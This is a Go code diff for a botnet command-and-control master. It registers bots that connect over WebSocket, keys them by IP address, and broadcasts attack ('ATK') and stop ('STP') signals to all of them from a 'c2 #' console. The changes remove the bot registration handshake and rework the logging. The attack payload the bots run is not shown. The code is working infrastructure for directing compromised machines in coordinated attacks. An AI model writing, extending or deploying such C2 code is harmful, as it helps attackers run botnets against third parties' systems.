@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
+	"net"
 	"net/http"
 	"strings"
 	"sync"
@@ -17,9 +18,8 @@ import (
 // for bots to reach and establish WS handshake
 
 const (
-	SIGNAL_REG = "R"
-	SIGNAL_ATK = "A"
-	SIGNAL_STP = "S"
+	SIGNAL_ATK = "ATK"
+	SIGNAL_STP = "STP"
 )
 
 // Structure of payload for outbound messages to registered bots. Master already knows bots' IP
@@ -44,6 +44,13 @@ var upgrader = websocket.Upgrader{ // Upgrades connection to WS
 	},
 }
 
+// Helper function to maintain pretty logs and console
+func logEvent(format string, args ...any) {
+	fmt.Print("\r\033[2K")
+	log.Printf(format, args...)
+	fmt.Print("c2 # ")
+}
+
 func NewMaster() *Master {
 	return &Master{}
 }
@@ -66,50 +73,35 @@ func (m *Master) Serve(addr string) error {
 func (m *Master) handleBot(w http.ResponseWriter, r *http.Request) {
 	conn, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
-		log.Printf("Failed to upgrade WS connection: %v\n", err)
+		logEvent("Failed to upgrade WS connection: %v", err)
 		return
 	}
 
-	_, data, err := conn.ReadMessage()
+	host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
 	if err != nil {
-		conn.Close()
-		return
-	}
-
-	var msg struct {
-		Payload string `json:"payload"`
-		From    string `json:"from"`
-	}
-
-	// Master expects a specific message from Bot for registration
-	if err := json.Unmarshal(data, &msg); err != nil || msg.Payload != SIGNAL_REG || msg.From == "" {
-		log.Printf("Invalid registration from %v! Received: %s\n", conn.RemoteAddr(), msg.Payload)
+		logEvent("Failed to determine bot IP: %v", err)
 		conn.Close()
 		return
 	}
 
 	// Stores newly registered bot, overwritting same IDs
-	bot := &Bot{Addr: msg.From, Conn: conn}
-	if old, loaded := m.bots.LoadOrStore(msg.From, bot); loaded {
+	bot := &Bot{Addr: host, Conn: conn}
+	if old, loaded := m.bots.LoadOrStore(host, bot); loaded {
 		oldBot := old.(*Bot) // Casting because value is originally of type "Any"
 		oldBot.Conn.Close()
 
-		m.bots.Store(msg.From, bot)
+		m.bots.Store(host, bot)
 	}
 
 	// This is just an illusion to maintain the pretty CLI
-	fmt.Println()
-	log.Printf("[+] Bot Connected: %s\n", msg.From)
-	fmt.Print("\nc2 # ")
+	logEvent("[+] Bot Connected: %s", host)
 
 	// Graceful termination
 	defer func() {
-		m.bots.Delete(msg.From)
+		m.bots.Delete(host)
 		conn.Close()
 
-		fmt.Println()
-		log.Printf("[-] Bot Disconnected: %s\n", msg.From)
-		fmt.Print("\nc2 # ")
+		logEvent("[-] Bot Disconnected: %s", host)
 	}()
 
 	// Keeping the connection alive
@@ -124,7 +116,7 @@ func (m *Master) handleBot(w http.ResponseWriter, r *http.Request) {
 			continue
 		}
 
-		log.Printf("[%s] %s", msg.From, incoming.Payload)
+		logEvent("[←] From %s: %s", host, incoming.Payload)
 	}
 }
 
@@ -140,6 +132,9 @@ func (m *Master) send(bot *Bot, payload string) error {
 func (m *Master) broadcast(payload string) error {
 	var wg sync.WaitGroup
 
+	var mu sync.Mutex // For pretty logs
+	var logs []string
+
 	m.bots.Range(func(_, value any) bool {
 		bot := value.(*Bot)
 		wg.Add(1)
@@ -149,17 +144,26 @@ func (m *Master) broadcast(payload string) error {
 
 			// NOTE: Hardcoded Attack signal right now
 			if err := m.send(bot, payload); err != nil {
-				log.Printf("[!] Failed to send payload (%s) to %s: %v\n", payload, bot.Addr, err)
+				mu.Lock()
+				logs = append(logs, fmt.Sprintf("[!] Failed to send payload (%s) to %s: %v", payload, bot.Addr, err))
+
+				mu.Unlock()
 				return
 			}
 
-			log.Printf("[✓] %s ← %s \n", bot.Addr, payload)
+			mu.Lock()
+			logs = append(logs, fmt.Sprintf("[✓] %s ← %s", bot.Addr, payload))
+			mu.Unlock()
 		}()
 
 		return true
 	})
 
 	wg.Wait() // Waits for everyone to finish (Blocking fashion)
+	for _, msg := range logs {
+		log.Printf("%s", msg)
+	}
+
 	return nil
 }
 
